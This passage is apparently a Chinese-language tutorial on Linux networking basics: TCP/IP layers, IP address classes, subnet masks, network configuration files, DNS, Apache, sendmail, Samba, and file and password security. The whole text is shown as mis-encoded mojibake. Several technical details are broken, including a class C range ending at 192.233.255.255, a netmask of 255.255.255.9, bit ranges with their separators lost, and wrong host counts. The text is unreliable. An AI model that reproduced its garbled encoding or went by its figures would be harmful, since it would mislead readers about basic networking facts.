è¾“å±‚ã€ç½‘é™…å±‚å’Œç½‘ç»œæ¥å£å±‚ã€‚å…¶ä¸­ï¼š TCP/IP ç½‘ç»œæ¥å£å±‚å¯¹åº”äº OSI å‚è€ƒæ¨¡å‹çš„ç‰©ç†å±‚å’Œæ•°æ®é“¾è·¯å±‚ï¼› TCP/IP ç½‘é™…å±‚å¯¹åº”äº OSI å‚è€ƒæ¨¡å‹çš„ç½‘ç»œå±‚ï¼› TCP/IP ä¼ è¾“å±‚åŒ…å« TCPã€UDP ä¸¤ä¸ªåè®®ï¼Œå¯¹åº”äº OSI å‚è€ƒæ¨¡å‹çš„ä¼ è¾“å±‚ï¼› TCP/IP åº”ç”¨å±‚åŒ…å«äº† OSI å‚è€ƒæ¨¡å‹çš„ä¼šè¯å±‚ã€è¡¨ç¤ºå±‚ã€åº”ç”¨å±‚ï¼› TCP/IP åè®®æ˜¯ç”±ä¸€ç»„é€šä¿¡åè®®ç»„æˆçš„åè®®ç°‡ï¼Œå…¶æ ¸å¿ƒéƒ¨åˆ†åŒ…æ‹¬ä¼ è¾“å±‚åè®®ï¼ˆTCP å’Œ UDPï¼‰ã€ç½‘ç»œå±‚åè®®ï¼ˆIPï¼‰å’Œç½‘ç»œæ¥å£å±‚ï¼Œè¿™ä¸‰å±‚éƒ¨åˆ†çš„åè®®å†…å®¹éƒ½åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­å®ç°ã€‚è€Œåº”ç”¨å±‚åè®®ï¼Œå¦‚ FTPã€HTTP ç­‰åè®®éƒ½æ˜¯é€šè¿‡ç½‘ç»œç¼–ç¨‹æ¥å£ä¸æ ¸å¿ƒåè®®æ‰“äº¤é“ï¼Œæ•´ä¸ªåè®®ç°‡æ˜¯ä¸€ç§åˆ†å±‚ç»“æ„ï¼Œä¸‹å±‚ä¸ºä¸Šå±‚æœåŠ¡ï¼Œä¸åŒå±‚æ¬¡ä¹‹é—´é€šè¿‡ä¸€äº›æ¥å£é€šä¿¡ã€‚ ä»¥å¤ªç½‘ 1980 å¹´ 9 æœˆç”±ç¾å›½ Xeroxã€Intelã€DEC å…¬å¸åˆä½œç¬¬ä¸€æ¬¡å…¬å¸ƒäº† Ethernet çš„ç‰©ç†å±‚å’Œæ•°æ®é“¾è·¯å±‚çš„æŠ€æœ¯è§„èŒƒï¼Œæˆä¸ºä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªå±€åŸŸç½‘å·¥ä¸šæ ‡å‡†ã€‚IEEE 802.3 å›½é™…æ ‡å‡†æ˜¯åœ¨ Ethernet æ ‡å‡†çš„åŸºç¡€ä¸Šåˆ¶å®šçš„ã€‚ ä»¥å¤ªç½‘å·¥ä½œèµ·æ¥å°±åƒä¸€ä¸ªæ€»çº¿ç³»ç»Ÿï¼Œæ¯ä¸€å°æœºå™¨éƒ½é€šè¿‡ä¸€ä¸ªåˆ†æ¥å™¨æŒ‚åœ¨ä¸€æ ¹å¾ˆé•¿çš„ç”µç¼†ä¸Šã€‚ä¸ºäº†è®©æœºå™¨è¯†åˆ«åˆ°è‡ªå·±ç”Ÿï¼Œæ¯å—ä»¥å¤ªç½‘å¡éƒ½æœ‰ä¸€ä¸ªç”±åˆ¶é€ å•†å”¯ä¸€åˆ†é…çš„åœ°å€ MAC åœ°å€ã€‚å½“ä¸€å—ä»¥å¤ªç½‘å¡æƒ³è¦åŒå¦ä¸€å—ä»¥å¤ªç½‘å¡å¯¹è¯æ—¶ï¼Œå®ƒå°†å‘æ•´ä¸ªä»¥å¤ªç½‘ç”µç¼†å‘é€ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬è‡ªå·±çš„ MAC åœ°å€å’Œæ¥æ”¶è€…çš„ MAC åœ°å€ã€‚ä¸¤å—ä»¥å¤ªç½‘å¡è¯•å›¾åœ¨åŒä¸€æ—¶é—´å‘é€æ•°æ®æ—¶ï¼Œä¾¿ä¼šäº§ç”Ÿå†²çªã€‚è§£å†³è¿™ç§å†²çªçš„åŠæ³•å°±æ˜¯ä¸¤å°è®¡ç®—æœºå–æ¶ˆè¿™æ¬¡å‘é€å„è‡ªç­‰å¾…ä¸€æ®µéšæœºæ—¶é—´å†å‘é€æ•°æ®çš„å°è¯•ã€‚ å…è®¸ Linux å’Œ TCP/IP åœ¨ä»¥å¤ªç½‘åœ°å€å’Œ IP åœ°å€é—´è¿›è¡Œè¿æ¥çš„æ˜¯åœ°å€è§£æåè®®ï¼ˆARPï¼‰ç¼“å­˜ã€‚å½“ä¸€å° Linux æœºå™¨å¼€å§‹åœ¨ä»¥å¤ªç½‘ä¸Šå‘æ¶ˆæ¯æ—¶ï¼Œå®ƒä¼šé€šè¿‡ ARP è¯¢é—®å­ç½‘ä¸Šå…¶ä»–æœºå™¨çš„ MAC åœ°å€ã€‚ IP åè®® IP åè®®ä½äº TCP/IP åè®®ç°‡çš„ç¬¬ä¸‰å±‚ï¼Œæ˜¯ TCP/IP åè®®çš„ä¼ è¾“ç³»ç»Ÿï¼Œä¹Ÿæ˜¯æ•´ä¸ª TCP/IP åè®®ç°‡çš„æ ¸å¿ƒã€‚ IP åè®®è´Ÿè´£æ•°æ®æŠ¥åœ¨è®¡ç®—æœºä¹‹é—´çš„å¯»å€ï¼Œå†³å®šæ•°æ®ä¼ é€åˆ°å“ªé‡Œä»¥åŠå‡ºç°ç½‘ç»œæ•…éšœæ—¶å¦‚ä½•æ›´æ¢è·¯ç”±ã€‚IP ä¸ä¿è¯ä¼ é€çš„å¯é æ€§ï¼Œåœ¨ä¸»æœºèµ„æºä¸è¶³çš„æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½ä¸¢å¼ƒæŸäº›æ•°æ®åŒ…ï¼ŒåŒæ—¶ IP ä¹Ÿä¸ä¼šæ£€æŸ¥æ•°æ®é“¾è·¯å±‚ä¸¢å¼ƒçš„æŠ¥æ–‡ã€‚ 1ï¼‰IP åœ°å€ã€‚TCP/IP ç½‘ç»œè¦è¿›è¡Œé€šä¿¡ï¼Œæ¯ä¸€å°ä¸»æœºéƒ½è¦é¢„å…ˆåˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ 32 ä½åœ°å€ä½œä¸ºè¯¥ä¸»æœºçš„æ ‡è¯†ç¬¦ï¼Œè¿™ä¸ªä¸»æœºå¿…é¡»ä½¿ç”¨è¯¥åœ°å€è¿›è¡Œæ‰€æœ‰é€šä¿¡æ´»åŠ¨ï¼Œè¿™ä¸ªåœ°å€ä¹Ÿç§°ä¸º IP åœ°å€ã€‚IP åœ°å€é€šå¸¸ç”±ç½‘ç»œæ ‡è¯† ID å’Œä¸»æœºæ ‡è¯†ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå¯ä»¥æ ‡è¯†äº’è”ç½‘ç»œä¸­ä»»ä½•ä¸€ä¸ªç½‘ç»œä¸­çš„ä»»ä½•ä¸»æœºã€‚ç½‘ç»œæ ‡è¯†ä¹Ÿç§°ä¸ºç½‘ç»œåœ°å€ï¼Œç”¨äºè¾¨åˆ«å­ç½‘ï¼ŒåŒä¸€å­ç½‘ä¸Šçš„æ‰€æœ‰ TCP/IP ä¸»æœºçš„ç½‘ç»œ ID éƒ½ç›¸åŒã€‚ä¸»æœºæ ‡è¯†ä¹Ÿç§°ä¸ºä¸»æœºåœ°å€ï¼Œç”¨äºè¾¨åˆ«æ¯ä¸€ä¸ªç½‘ç»œä¸­çš„ä¸»æœºã€‚IP åœ°å€æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](d-Linux ç½‘ç»œåŸºç¡€/2.png) å…¶ä¸­ï¼Œç½‘ç»œ ID æ˜¯å¤§äº 1 ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œä¸»æœº ID ä¹Ÿæ˜¯å¤§äº 1 ä½çš„äºŒè¿›åˆ¶æ•°ã€‚å¦‚è®¡ç®—ä¸­å¿ƒç½‘å…³åœ°å€ 132.111.002.001 åˆ†è§£æˆåè®®æ‰€è®¤è¯†çš„åœ°å€å°±æ˜¯ï¼šç½‘ç»œ IDï¼ˆ132.111ï¼‰å’Œä¸»æœº IDï¼ˆ002.001ï¼‰ IP åœ°å€åˆ†ç±»å¦‚ä¸‹ï¼š A ç±»åœ°å€ï¼šç½‘ç»œç±»åˆ«å­—æ®µå  1 ä½ï¼Œå³ç¬¬ 0 ä½ä¸º 0ï¼Œè¡¨ç¤ºæ˜¯ A ç±»åœ°å€ï¼Œç¬¬ 17 ä½è¡¨ç¤ºç½‘ç»œåœ°å€ï¼Œç¬¬ 831 ä½è¡¨ç¤ºä¸»æœºåœ°å€ã€‚å®ƒæ‰€è¡¨ç¤ºçš„èŒƒå›´ä¸º 0.0.0.0~127.255.255.255ï¼Œå³èƒ½å¤Ÿè¡¨ç¤º 126 ä¸ªç½‘ç»œåœ°å€ï¼Œ16387064 ä¸ªä¸»æœºåœ°å€ã€‚A ç±»åœ°å€é€šå¸¸ç”¨äºè¶…å¤§å‹ç½‘ç»œåœºåˆã€‚ B ç±»åœ°å€ï¼šç½‘ç»œç±»åˆ«å­—æ®µå  2 ä½ï¼Œå³ç¬¬ 0ã€1 ä½ä¸º 1 0 ï¼Œè¡¨ç¤º B ç±»åœ°å€ï¼Œç¬¬ 215 ä½è¡¨ç¤ºç½‘ç»œåœ°å€ï¼Œç¬¬ 1631 ä½è¡¨ç¤ºä¸»æœºåœ°å€ï¼Œå®ƒæ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ä¸º 128.0.0.0~191.255.255.255ï¼Œå³èƒ½å¤Ÿè¡¨ç¤º 16256 ä¸ªç½‘ç»œåœ°å€ï¼Œ64576 ä¸ªä¸»æœºåœ°å€ã€‚B ç±»åœ°å€é€šå¸¸ç”¨äºå¤§å‹ç½‘ç»œçš„åœºåˆã€‚ C ç±»åœ°å€ï¼šç½‘ç»œç±»åˆ«å­—æ®µå  3 ä½ï¼Œå³ç¬¬ 0ã€1ã€2 ä½ä¸º 110 ï¼Œè¡¨ç¤º C ç±»åœ°å€ï¼Œç¬¬ 323 ä½è¡¨ç¤ºç½‘ç»œåœ°å€ï¼Œç¬¬ 2431 ä½è¡¨ç¤ºä¸»æœºåœ°å€ã€‚å®ƒæ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ 192.0.0.0~192.233.255.255ï¼Œå³èƒ½å¤Ÿè¡¨ç¤º 2064512 ä¸ªç½‘ç»œåœ°å€ï¼Œ254 ä¸ªä¸»æœºåœ°å€ã€‚C ç±»åœ°å€é€šå¸¸ç”¨äºæ ¡å›­ç½‘æˆ–ä¼ä¸šç½‘ã€‚ æ­¤å¤–ï¼Œè¿˜æœ‰ D ç±»å’Œ E ç±» IP åœ°å€ã€‚ D ç±»åœ°å€ç”¨äºå¤šå€å¹¿æ’­åœ°å€ï¼Œä¾›ç‰¹æ®Šåè®®å‘é€‰å®šçš„èŠ‚ç‚¹å‘é€ä¿¡æ¯ç”¨ã€‚E ç±»åœ°å€æš‚æ—¶ä¿ç•™ã€‚ 2ï¼‰å­ç½‘æ©ç ã€‚é€šå¸¸å°†ä¸€ä¸ªè¾ƒå¤§ç½‘ç»œåˆ†ä¸ºå¤šä¸ªè¾ƒå°çš„ç½‘ç»œï¼Œæ¯ä¸ªå°ç½‘ç»œä½¿ç”¨ä¸åŒçš„ç½‘ç»œ ID ï¼Œè¿™æ ·çš„å°ç½‘ç»œç§°ä¸ºå­ç½‘ã€‚ åœ¨ç½‘ç»œé€šä¿¡æ—¶ï¼Œè‹¥æƒ³è¦æ‰¾åˆ°å­ç½‘ï¼Œéœ€è¦å®šä¹‰å­ç½‘æ©ç ã€‚å­ç½‘æ©ç ä¸ IP åœ°å€ä¸€æ ·ä¹Ÿæ˜¯ä¸€ä¸ª 32 ä½çš„å€¼ï¼Œå°†å®ƒä¸ä¸»æœºçš„ IP åœ°å€åšæŒ‰ä½ â€œä¸â€ è¿ç®—ï¼Œå¯ä»¥å±è”½ä¸€éƒ¨åˆ† IP åœ°å€ï¼Œä»è€Œç¡®å®šå‡ºè¿™ä¸ªç½‘ç»œåœ°å€ã€‚å­ç½‘æ©ç å¯æ¦‚æ‹¬ä¸¤ä¸ªåŠŸèƒ½ï¼šç”¨äºåŒºåˆ†ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ï¼›ç”¨äºå°†ç½‘ç»œåˆ†å‰²ä¸ºå¤šä¸ªå­ç½‘ã€‚ TCP åè®® TCP åè®®æ˜¯ä¸€ç§é¢å‘è¿æ¥çš„ã€å¯é çš„ä¼ è¾“å±‚åè®®ã€‚é¢å‘è¿æ¥æ˜¯æŒ‡ä¸€æ¬¡æ­£å¸¸çš„ TCP ä¼ è¾“éœ€è¦é€šè¿‡åœ¨ TCP å®¢æˆ·ç«¯å’Œ TCP æœåŠ¡ç«¯ä¹‹é—´å»ºç«‹ç‰¹å®šçš„è™šç”µè·¯è¿æ¥æ¥å®Œæˆï¼Œè¿™ä¸ªè¿‡ç¨‹é€šå¸¸ç§°ä¸ºâ€œä¸‰æ¬¡æ¡æ‰‹â€ï¼Œå¯é çš„ä¼ è¾“åè®®å¯é¿å…æ•°æ®ä¼ è¾“é”™è¯¯ã€‚TCP åè®®å¯ä»¥æ”¯æŒè®¸å¤šé«˜å±‚åè®®ï¼Œå®ƒå¯¹é«˜å±‚åè®®çš„æ•°æ®ç»“æ„æ²¡æœ‰ä»»ä½•è¦æ±‚ï¼Œå¯¹äº TCP æ¥è¯´åªæ˜¯å°†è¿™äº›ä¼ è¾“çš„æ•°æ®ç»“æ„ä½œä¸ºä¸€ç§è¿ç»­çš„æ•°æ®æµã€‚ UDP åè®® UDP åè®®ä¹Ÿæ˜¯å¸¸ç”¨çš„ä¼ è¾“å±‚åè®®ï¼Œæä¾›éé¢å‘è¿æ¥çš„ã€ä¸å¯é çš„æ•°æ®æµä¼ è¾“æœåŠ¡ã€‚è¿™ç§æœåŠ¡ä¸ç¡®å®šæŠ¥æ–‡æ˜¯å¦åˆ°è¾¾ï¼Œä¸å¯¹æŠ¥æ–‡æ’åºï¼Œä¹Ÿä¸è¿›è¡Œæµé‡æ§åˆ¶ï¼Œå› æ­¤ UDP æŠ¥æ–‡å¯èƒ½å‡ºç°ä¸¢å¤±ã€é‡å¤å’Œå¤±åºç­‰ç°è±¡ã€‚ä¸ TCP ç›¸åŒçš„ç‰¹ç‚¹ï¼ŒUDP åè®®ä¹Ÿå¯ä»¥é€šè¿‡ç«¯å£å·æ”¯æŒå¤šè·¯å¤ç”¨åŠŸèƒ½ã€‚UDP æ˜¯ä¸€ç§ç®€å•çš„åè®®æœºåˆ¶ï¼Œé€šä¿¡å¼€é”€å°ï¼Œæ•ˆç‡é«˜ï¼Œé€‚åˆå¯¹äºå¯é æ€§è¦æ±‚ä¸é«˜å½“éœ€è¦å¿«æ·ã€ä½å»¶è¿Ÿé€šä¿¡çš„åº”ç”¨åœºåˆã€‚ 0x02 é…ç½®Linuxç½‘ç»œ åœ¨ Linux ç³»ç»Ÿä¸­ï¼ŒTCP/IP ç½‘ç»œæ˜¯é€šè¿‡è‹¥å¹²æ–‡æœ¬æ–‡ä»¶è¿›è¡Œé…ç½®çš„ï¼Œé€šè¿‡äº†è§£å’Œä¿®æ”¹è¿™äº›é…ç½®æ–‡ä»¶å°±èƒ½å¤Ÿå®Œæˆ Linux è”ç½‘åŠŸèƒ½ã€‚ä¸‹é¢å°†é€ä¸ªä»‹ç» Linux ç½‘ç»œé…ç½®ç›¸å…³çš„æ–‡ä»¶ã€‚ /etc/HOSTNAME æ–‡ä»¶ è¯¥æ–‡ä»¶åŒ…å«ç³»ç»Ÿçš„ä¸»æœºåç§°å’Œå®Œå…¨çš„åŸŸåï¼Œå¦‚ï¼šlinux.cic.tsinghua.edu.cnï¼ˆLinux ä¸ºä¸»æœºåï¼Œcic.tsinghua.edu.cn ä¸ºåŸŸåï¼‰ /etc/host.conf æ–‡ä»¶ è¯¥æ–‡ä»¶æŒ‡å®šå¦‚ä½•è§£æä¸»æœºåã€‚Linux é€šè¿‡è§£æå™¨åº“è·å¾—ä¸»æœºåå¯¹åº”çš„ IP åœ°å€ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123order bind,hosts # æŒ‡å®šä¸»æœºåæŸ¥è¯¢é¡ºåºï¼Œè¿™é‡Œä¼˜å…ˆä½¿ç”¨ DNS è§£æåŸŸåï¼Œç„¶åæŸ¥è¯¢ /etc/hosts æ–‡ä»¶multi on # è¡¨ç¤º /etc/hosts æ–‡ä»¶ä¸­æŒ‡å®šçš„ä¸»æœºå¯ä»¥æœ‰å¤šä¸ªåœ°å€nospoof on # æŒ‡ä¸å…è®¸å¯¹è¯¥æœåŠ¡å™¨è¿›è¡Œ IP æ¬ºéª— /etc/services æ–‡ä»¶ /etc/services æ–‡ä»¶ä¸­åŒ…å«äº†æœåŠ¡åå’Œç«¯å£å·ä¹‹é—´çš„æ˜ å°„ï¼Œä¸å°‘ç³»ç»Ÿç¨‹åºè¦ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456tcpmux 1/tcp #TCP port service multiplexerecho 7/tcpecho 7/udpdiscard 9/tcp sink nulldiscard 9/udp sink nullsystatll/tcp users /etc/sysconfig/network æ–‡ä»¶ è¯¥æ–‡ä»¶ç”¨æ¥æŒ‡å®šæœåŠ¡å™¨ä¸Šçš„ç½‘ç»œé…ç½®ä¿¡æ¯ï¼ŒåŒ…å«æ§åˆ¶ä¸ç½‘ç»œæœ‰å…³çš„æ–‡ä»¶å’Œå®ˆæŠ¤ç¨‹åºè¡Œä¸ºçš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š 123456NETWORKING=yes #ç½‘ç»œæ˜¯å¦è¢«é…ç½®HOSTNAME=machine1DOMAINNAME=cic.tsinghua.edu.cn # åˆ†é…ç»™æœºå™¨çš„åŸŸåGATEWAY=210.34.6.2 #ç½‘å…³çš„ IP åœ°å€FORWARD_IPV4=yes #æ˜¯å¦å¼€å¯ IP è½¬å‘åŠŸèƒ½GATEWAYDEV=eth0 #gw-devè¡¨ç¤ºç½‘å…³çš„è®¾å¤‡å /etc/sysconfig/network-scripts/ifcfg-ethN æ–‡ä»¶ 1234567DEVICE=&quot;eth0&quot;IPADDR=&quot;192.168.2.1&quot;NETMASK=&quot;255.255.255.9&quot;NETWORK=&quot;192.168.2.0&quot;BROADCAST=&quot;192.168.2.255&quot;ONBOOT=&quot;yes&quot;BOOTPROTO=&quot;none&quot; /etc/hosts æ–‡ä»¶ /etc/hosts æ–‡ä»¶åŒ…å«äº† IP åœ°å€å’Œä¸»æœºåä¹‹é—´çš„æ˜ å°„ï¼Œè¿˜åŒ…æ‹¬ä¸»æœºåçš„åˆ«åã€‚IP åœ°å€çš„è®¾è®¡ä½¿è®¡ç®—æœºå®¹æ˜“è¯†åˆ«ï¼Œä½†å´å¾ˆéš¾è®°ä½å®ƒä»¬ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåˆ›å»ºäº† /etc/hosts æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123127.0.0.1 machanel localhost.localdomain localhost192.168.1.100 machine7192.168.1.101 otherpc otheralias /etc/resolv.conf æ–‡ä»¶ è¯¥æ–‡ä»¶æ˜¯ç”± DNS å®¢æˆ·ç«¯è§£æå™¨ï¼ˆresolver ä¸€ä¸ªæ ¹æ®ä¸»æœºåè§£æ IP åœ°å€çš„åº“ï¼‰ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œå®ƒåŒ…å«ä¸»æœºçš„åŸŸåæœç´¢é¡ºåºå’Œ DNS æœåŠ¡å™¨çš„åœ°å€ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š 123search cic.tsinghua.edu.cnnameserver 166.111.4.5nameserver 166.111.8.28 /etc/init.d/network ä¸»æœºåœ°å€ã€å­ç½‘æ©ç å’Œç½‘å…³ è¿™ä¸ªæ–‡ä»¶å£°æ˜äº† IP åœ°å€ã€æ©ç ã€ç½‘ç»œã€å¹¿æ’­åœ°å€å’Œé»˜è®¤è·¯ç”±å™¨çš„å˜é‡ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345IPADDR=192.168.1.100NETMASK=255.255.255.0NETWORK=192.168.1.0BROADCAST=192.168.1.255GATEWAY=192.168.1.1 0x03 åŸŸåæœåŠ¡å™¨DNS è¿æ¥ TCP/IP çš„æ¯ä¸ªç½‘ç»œæ¥å£ç”¨ä¸€ä¸ªå”¯ä¸€çš„ 32 ä½çš„ IP åœ°å€æ ‡è¯†ï¼Œä½†ç”±äºæ•°å­—æ¯”è¾ƒå¤æ‚ï¼Œéš¾ä»¥è®°å¿†ï¼Œè€Œä¸”æ²¡æœ‰å½¢è±¡æ€§ï¼Œå› è€Œå‘æ˜äº†åŸŸåç³»ç»Ÿï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨æ˜“äºç†è§£å’Œè¾ƒä¸ºå½¢è±¡çš„åç§°ä½œä¸ºä¸€å°è®¡ç®—æœºçš„æ ‡è¯†ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ•°å­—åœ°å€å’ŒåŸŸååœ°å€å¯ä»¥äº¤æ›¿ä½¿ç”¨ï¼Œä½†æ— è®ºç”¨æ•°å­—åœ°å€æˆ–æ˜¯åŸŸåè¿›è¡Œç½‘ç»œåº”ç”¨æ—¶ï¼Œæ€»æ˜¯ä»¥ IP åœ°å€ä¸ºåŸºç¡€è¿›è¡Œçš„ã€‚åœ¨ç½‘ç»œè¿›è¡Œè¿æ¥å‰ï¼Œç³»ç»Ÿå¿…é¡»å°†åŸŸååœ°å€è½¬æ¢æˆ IP åœ°å€ï¼Œè¿™å°±æ˜¯ DNS çš„ä»»åŠ¡ã€‚ å¤§å¤šæ•° DNS æœåŠ¡å™¨éƒ½ä½¿ç”¨ Bindã€‚DNS æä¾›äº†ä»åå­—åˆ° IP åœ°å€çš„æ˜ å°„å…³ç³»ï¼Œè¿™ç§æ˜ å°„å…³ç³»ä¸å¿…æ˜¯ä¸€ä¸€æ˜ å°„ï¼Œä¸€ä¸ª IP å¯ä»¥æœ‰å¤šä¸ªåŸŸåï¼Œä¸€ä¸ªåŸŸåä¹Ÿå¯ä»¥å¯¹åº”å¤šä¸ª IPã€‚ 0x04 Apache æœåŠ¡å™¨ Web æœåŠ¡å™¨æ˜¯äº’è”ç½‘ä¸Šäººé©¬ä½¿ç”¨æœ€å¤šçš„ä¸€ç§æœåŠ¡å™¨ï¼Œå®ƒå·²ç»æˆäº†å½“ä»Šç¤¾ä¼šä¸å¯ç¼ºå°‘çš„ä¸€ç§ä¿¡æ¯ä¼ æ’­æ–¹å¼ã€‚ç›®å‰å¸‚åœºä¸Šæœ€æµè¡Œçš„è¿è¡Œäº Linux ä¸Šçš„ Web æœåŠ¡å™¨æ˜¯ Apache æœåŠ¡å™¨ã€‚ çºµè§‚ Apacheï¼Œå®ƒä¸ºç½‘ç»œç®¡ç†å‘˜æä¾›äº†ä¸°å¯Œå¤šå½©çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬ç›®å½•ç´¢å¼•ã€ç›®å½•åˆ«åã€å†…å®¹åå•†ã€å¯é…ç½®çš„ HTTP é”™è¯¯æŠ¥å‘Šã€CGI ç¨‹åºçš„ SetUID æ‰§è¡Œã€å­è¿›ç¨‹èµ„æºç®¡ç†ã€æœåŠ¡å™¨ç«¯å›¾åƒæ˜ å°„ã€é‡å†™ URLã€URL æ‹¼å†™æ£€æŸ¥ä»¥åŠè”æœºæ‰‹å†Œ man ç­‰ã€‚ 0x05 é‚®ä»¶æœåŠ¡å™¨ è‡ªä»åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡ U.C Berkeley å®Œæˆ sendmail çš„æœ€åˆç‰ˆæœ¬ä»¥æ¥ï¼Œsendmail å—åˆ°äº†ä¸šç•Œé•¿ä¹…çš„é‡è§†ï¼Œä» 1983 å¹´çš„ V5 ç‰ˆæœ¬ä¸€ç›´åˆ° 1993 å¹´æ”¹å†™çš„ V8 ç‰ˆæœ¬ï¼Œéƒ½å—åˆ°äº†äººä»¬çš„å°Šé‡ã€‚ sendmail ä¸º Linux æä¾› SMTP è¿æ¥æ‰€éœ€çš„æœåŠ¡ï¼Œå®ƒå¯¹é‚®ä»¶ä¿¡æ¯è¿›è¡Œåˆ†æå¹¶æŠŠå®ƒä¼ é€åˆ°ç›®çš„åœ°ã€‚sendmail é‡‡ç”¨å¼€æ”¾æºä»£ç çš„å¼€å‘æ–¹å¼ç¼–å†™ï¼Œå…¶æ‰€éœ€æºç éƒ½å¯ä»¥å…è´¹å¾—åˆ°å¹¶è‡ªç”±å‘å¸ƒã€‚å®ƒåªæä¾›äº†é‚®ä»¶è·¯ç”±åŠŸèƒ½ï¼Œå°†å‘é€ç•™ç»™ç®¡ç†å‘˜å¯ä»¥é€‰æ‹©çš„æœ¬åœ°ä»£ç†ã€‚ 0x06 samba æœåŠ¡å™¨ å¯ä»¥æŠŠ samba å½“æˆæ˜¯ä¸€ä¸ªå±€åŸŸç½‘ç»œä¸Šçš„ file/printer severï¼Œå®ƒå¯ä»¥æä¾›æ–‡ä»¶ç³»ç»Ÿã€æ‰“å°æœºæˆ–å…¶ä»–ä¿¡æ¯ï¼Œå¹¶ä¸ samba sever åœ¨åŒä¸€ä¸ªå­ç½‘åŸŸçš„ samba client å…±äº«ã€‚ samba æ˜¯ç”¨æ¥å®ç° SMB çš„ä¸€ç§è½¯ä»¶ï¼Œå®ƒçš„å·¥ä½œåŸç†æ˜¯è®© NETBIOS å’Œ SMB è¿™ä¸¤ä¸ªåè®®è¿è¡Œäº TCP/IP é€šä¿¡åè®®ä¹‹ä¸Šï¼Œå¹¶ä½¿ç”¨ NETBEUI åè®®è®© Linux è®¡ç®—æœºå¯ä»¥åœ¨ç½‘ç»œä¸Šè¢«å…¶ä»–è®¡ç®—æœºçœ‹åˆ°ã€‚æ‰€ä»¥ï¼Œé€šè¿‡ samba èƒ½å¤Ÿä½¿å¾— ä¸åŒç³»ç»Ÿçš„è®¡ç®—æœºå¯ä»¥åœ¨ç½‘ç»œä¸Šè¿›è¡Œæ²Ÿé€šå’Œå…±äº«æ–‡ä»¶ã€‚ 0x07 Linuxç³»ç»Ÿçš„æ–‡ä»¶å®‰å…¨ Linux æ–‡ä»¶ç³»ç»Ÿæ˜¯ç”±æ–‡ä»¶å’Œç›®å½•ç»„æˆçš„æ ‘å½¢ç»“æ„ï¼Œæ¯ä¸ªæ–‡ä»¶ç›®å½•åŒ…æ‹¬æ–‡ä»¶ç±»å‹ã€æ–‡ä»¶çš„å­˜å–æƒé™ã€æ–‡ä»¶åã€æ–‡ä»¶æ‰€æœ‰è€…ã€æ–‡ä»¶å¤§å°ã€æ–‡ä»¶å»ºç«‹åŠä¿®æ”¹çš„æ—¥æœŸç­‰å†…å®¹ã€‚ä»»ä½•ä¸€é¡¹å†…å®¹é­å—æœªæˆæƒçš„ä¿®æ”¹ï¼Œæ–‡ä»¶çš„å®‰å…¨æ€§éƒ½å°†é­å—åˆ°ç ´åã€‚ä¿æŠ¤æ–‡ä»¶ç³»ç»Ÿçš„å®‰å…¨æ€§åº”è¯¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢å…¥æ‰‹ï¼š æ–‡ä»¶å­˜å–æƒé™çš„è®¾ç½®ï¼šæ–‡ä»¶å±æ€§å†³å®šäº†æ–‡ä»¶çš„è¢«è®¿é—®æƒé™ã€‚ è®¾ç½®ç”¨æˆ· ID å’ŒåŒç»„ç”¨æˆ· ID è®¸å¯ï¼šç”¨æˆ· ID è®¸å¯è®¾ç½®å’ŒåŒç»„ç”¨æˆ· ID è®¸å¯è®¾ç½®åªç»™äºˆå¯æ‰§è¡Œçš„ç›®æ ‡æ–‡ä»¶ã€‚ 0x08 ç”¨æˆ·å£ä»¤å®‰å…¨ æ¯ä¸ª Linux çš„ç”¨æˆ·éƒ½æ‹¥æœ‰ä¸€ä¸ªè´¦å·ï¼Œé€šè¿‡ç™»å½•åˆ°è¿™ä¸ªè´¦å·æ‰èƒ½æœ‰é™åˆ¶åœ°ä½¿ç”¨ç³»ç»Ÿï¼Œè€Œä¿æŠ¤è‡ªèº«æ–‡ä»¶å®‰å…¨çš„å”¯ä¸€å±éšœå°±æ˜¯å£ä»¤ï¼Œä¸€æ—¦è¿™é“å±éšœè¢«ç ´åï¼Œæ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨ä¾¿æ— æ³•å¾—åˆ°ä¿è¯ã€‚ Linux ç³»ç»Ÿä¸­çš„ /etc/passwd æ–‡ä»¶åŒ…å«äº†å…¨éƒ¨ç³»ç»Ÿéœ€è¦çŸ¥é“çš„å…³äºæ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ã€‚ 0x09 é˜²ç«å¢™æŠ€æœ¯ é˜²ç«å¢™çš„æ¦‚å¿µ é˜²ç«å¢™æ˜¯ä¸€ä¸ªçŸ›ç›¾ç»Ÿä¸€ä½“ï¼Œå®ƒæ—¢è¦é™åˆ¶ä¿¡æ¯çš„æµé€šï¼Œåˆè¦ä¿æŒä¿¡æ¯çš„æµé€šã€‚å› æ­¤ï¼Œæ ¹æ®ç½‘ç»œå®‰å…¨æ€§æ€»ä½“éœ€æ±‚ï¼Œé˜²ç«å¢™å¯ä»¥éµå¾ªä»¥ä¸‹ä¸¤ç§åŸºæœ¬åŸåˆ™ä¹‹ä¸€å®ç°ï¼š 